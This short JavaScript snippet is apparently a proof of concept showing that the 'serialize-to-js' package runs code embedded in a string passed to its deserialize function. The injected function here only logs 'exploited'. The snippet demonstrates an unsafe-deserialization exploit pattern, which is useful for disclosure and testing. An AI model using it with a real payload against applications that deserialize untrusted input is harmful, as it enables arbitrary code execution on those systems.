var payload = "{e: (function(){ console.log(`exploited`)})() }"
var serialize = require('serialize-to-js');
serialize.deserialize(payload);
